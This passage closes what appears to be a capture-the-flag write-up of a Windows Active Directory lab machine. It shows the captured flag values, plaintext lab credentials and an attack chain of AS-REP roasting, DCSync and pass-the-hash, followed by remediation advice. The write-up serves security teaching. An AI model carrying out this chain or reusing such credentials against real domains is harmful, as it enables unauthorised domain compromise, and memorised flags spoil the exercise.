cat C:\Users\Administrator\Desktop\root.txt
73b6893a471e3977b74e466e8f455d1d
```

---

## 🏆 Objectives Complete

### Flag Locations

**User Flag:**

- **Path:** `C:\Users\FSmith\Desktop\user.txt`
    
- **Hash:** `1cf802e519c0437929c018fefa822a70`
    

**Administrator Flag:**

- **Path:** `C:\Users\Administrator\Desktop\root.txt`
    
- **Hash:** `73b6893a471e3977b74e466e8f455d1d`
    

### Additional Loot

- **Credentials:**
    
    - `fsmith:Thestrokes23`
        
    - `EGOTISTICALBANK\svc_loanmanager:Moneymakestheworldgoround!`
        
    - Administrator NTLM hash (used for pass-the-hash)
        
- **AD Data:** Full domain structure, ACLs, and privilege graph from BloodHound.
    

---

## 🔒 Security Analysis & Remediation

### Vulnerabilities Summary

|Vulnerability|Severity|Impact|Exploitability|
|---|---|---|---|
|Kerberos AS-REP Roast (no preauth)|High|Credential compromise|Easy|
|Exposed AutoLogon credentials|High|Escalation via credential reuse|Medium|
|Over-privileged DCSync rights|Critical|Full domain compromise|Medium|

### Attack Chain

```
Port/Service Discovery → Web Enumeration → Username Harvesting → Kerberos User Enumeration → AS-REP Roast → Initial Access (Evil-WinRM as fsmith) → Local Enumeration (winPEAS) → AutoLogon Credential Retrieval → AD Graphing (BloodHound) → DCSync Attack → Administrator Hash Extraction → Pass-the-Hash → Full Domain Compromise
```

### Remediation Recommendations

1. **Enforce Kerberos preauthentication** on all accounts to prevent AS-REP roasting.
    
2. **Remove plaintext AutoLogon credentials**; use secure secret storage or eliminate AutoLogon entirely.
    
3. **Audit and restrict replication/DCSync rights**; ensure service accounts follow least privilege.
    
4. **Monitor anomalous replication/authentication behavior** (e.g., unusual DCSync/AS-REP requests).
    
5. **Segment domain admin activities** and protect high-privilege credentials with multi-factor and tiered administration.
    

---

_This assessment was conducted in a controlled environment for educational purposes. All techniques demonstrated should only be used against systems you own or have explicit permission to test._






